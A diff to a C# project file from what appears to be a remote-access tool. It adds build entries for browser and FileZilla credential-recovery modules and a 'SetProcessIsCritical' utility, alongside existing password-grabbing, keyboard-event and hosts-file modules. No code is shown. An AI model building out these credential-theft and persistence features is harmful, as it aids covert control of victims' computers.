@@ -82,10 +82,13 @@
     <Compile Include="Core\Packets\ClientPackets\SetStatusFileManager.cs" />
     <Compile Include="Core\Packets\ServerPackets\DoKeyboardEvent.cs" />
     <Compile Include="Core\Packets\ServerPackets\GetPasswords.cs" />
+    <Compile Include="Core\Recovery\Browsers\CoRom.cs" />
+    <Compile Include="Core\Recovery\Utilities\FileZilla.cs" />
     <Compile Include="Core\Utilities\FileSplit.cs" />
     <Compile Include="Core\Data\Host.cs" />
     <Compile Include="Core\Utilities\HostsManager.cs" />
     <Compile Include="Core\Utilities\NativeMethods.cs" />
+    <Compile Include="Core\Utilities\SetProcessIsCritical.cs" />
     <Compile Include="Core\Utilities\UnsafeStreamCodec.cs" />
     <Compile Include="Core\Compression\JpgCompression.cs" />
     <Compile Include="Core\Extensions\SocketExtensions.cs" />
